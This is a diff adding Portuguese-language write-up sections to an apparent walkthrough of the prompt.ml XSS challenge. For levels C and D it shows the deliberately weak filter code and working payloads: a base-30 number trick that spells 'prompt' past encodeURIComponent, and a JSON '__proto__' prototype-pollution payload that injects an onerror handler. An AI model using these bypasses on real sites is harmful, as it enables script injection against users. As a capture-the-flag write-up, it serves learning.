@@ -214,3 +214,60 @@ function escape(input) {
 Level B `"(prompt(1))in"`
 
 O nível B (11) nos permite injetar diretamente no que será o corpo de um elemento `script`. No entanto, antes de fazer isso, a string que podemos influenciar passa por um filtro rigoroso e não podemos injetar operadores ou outros elementos da linguagem que permitam uma fácil concatenação e injeção de payload. A solução aqui é usar um operador alfanumérico - ou seja, um operador que não nos obrigue a usar os caracteres especiais proibidos. Bem, existem vários desses e um que podemos é o operador `in`.
+
+
+## level C
+```javascript
+function escape(input) {
+    // in Soviet Russia...
+    input = encodeURIComponent(input).replace(/'/g, '');
+    // table flips you!
+    input = input.replace(/prompt/g, 'alert');
+
+    // ノ┬─┬ノ ︵ ( \o°o)\
+    return '<script>' + input + '</script> ';
+}        
+```
+level C `eval(0x258da033.toString(30))(1)`
+
+O nível C (12) tem um novo nível de dificuldade por conta do `encodeURIComponent` pois essa função faz com que caracteres como `/ ?` e outros que sejam condificados com URL e impossibilitando usarmos payloads que usamos nos níveis anteriores.Porém um jeito de contornar isso é simplesmente escrever o payload em outra base, como por exemplo hexadecimal. Por conta disso temos que usar `0x258da033.toString` onde `0x258da033` passado pra string fica `prompt` e assim burlando o filtro do level, fazendo a função `eval` chamar prompt por meio da base em hexadecimal e no final adicionar o `(1)`.
+
+## level D
+```javascript
+ function escape(input) {
+    // extend method from Underscore library
+    // _.extend(destination, *sources) 
+    function extend(obj) {
+        var source, prop;
+        for (var i = 1, length = arguments.length; i < length; i++) {
+            source = arguments[i];
+            for (prop in source) {
+                obj[prop] = source[prop];
+            }
+        }
+        return obj;
+    }
+    // a simple picture plugin
+    try {
+        // pass in something like {"source":"http://sandbox.prompt.ml/PROMPT.JPG"}
+        var data = JSON.parse(input);
+        var config = extend({
+            // default image source
+            source: 'http://placehold.it/350x150'
+        }, JSON.parse(input));
+        // forbit invalid image source
+        if (/[^\w:\/.]/.test(config.source)) {
+            delete config.source;
+        }
+        // purify the source by stripping off "
+        var source = config.source.replace(/"/g, '');
+        // insert the content using mustache-ish template
+        return '<img src="{{source}}">'.replace('{{source}}', source);
+    } catch (e) {
+        return 'Invalid image data.';
+    }
+}
+```
+level D ```{"source":{},"__proto__":{"source":"$`onerror=prompt(1)>"}}```
+ 
+Nesse nível devemos enviar um JSON com um source propositalmente inválido e um outro dentro de `__proto__`. O filtro remove o source inválido, sobrando só o do protótipo. Usa o poder de herança pra “injetar” código onde antes só era permitido texto simples. Finalmente, engana o .replace(/"/g,'') usando o $`` do replace, montando um onerror` sem precisar de aspas.
